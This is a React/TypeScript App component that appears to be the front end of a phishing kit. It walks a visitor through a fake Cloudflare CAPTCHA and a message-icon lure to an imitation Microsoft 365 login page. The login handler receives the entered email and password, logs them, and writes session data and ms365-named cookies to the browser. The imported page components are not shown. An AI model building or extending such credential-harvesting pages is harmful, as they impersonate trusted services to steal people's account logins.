import React, { useState } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import MicrosoftLoginPage from './components/MicrosoftLoginPage';

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');

  // Handle the complete flow - starts with CAPTCHA
  const handleCaptchaVerified = () => {
    console.log('✅ CAPTCHA verified - moving to message icon landing');
    setCurrentPage('message-icon');
  };

  const handleMessageOpen = () => {
    console.log('📧 Message icon clicked - moving to Microsoft OAuth');
    setCurrentPage('login');
  };

  const handleCaptchaBack = () => {
    console.log('⬅️ Back to CAPTCHA (refresh page)');
    window.location.reload();
  };

  const handleLoginSuccess = async (credentials: { email: string; password: string }) => {
    console.log('🔐 Login successful:', credentials);
    
    // Store credentials and perform cookie work
    const sessionData = {
      email: credentials.email,
      sessionId: Date.now().toString(),
      timestamp: new Date().toISOString()
    };
    
    localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
    sessionStorage.setItem('current_session', JSON.stringify(sessionData));
    
    // Set cookies for the session
    document.cookie = `ms365_session=${sessionData.sessionId}; path=/; secure; samesite=strict`;
    document.cookie = `ms365_email=${encodeURIComponent(credentials.email)}; path=/; secure; samesite=strict`;
    document.cookie = `ms365_auth_time=${Date.now()}; path=/; secure; samesite=strict`;
    
    console.log('🍪 Cookies set, redirecting back to landing page');
    
    // Redirect back to landing page (message icon)
    setTimeout(() => {
      setCurrentPage('message-icon');
    }, 1000);
  };

  const handleLoginError = (error: string) => {
    console.error('❌ Login error:', error);
    // Stay on login page for retry
  };

  const handleLoginBack = () => {
    console.log('⬅️ Back to message icon from login');
    setCurrentPage('message-icon');
  };

  // Render current page based on flow
  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
    
    case 'message-icon':
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );
    
    case 'login':
      return (
        <MicrosoftLoginPage
          onBack={handleLoginBack}
          onLoginSuccess={handleLoginSuccess}
          onLoginError={handleLoginError}
          showBackButton={true}
        />
      );
    
    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
  }
}

export default App;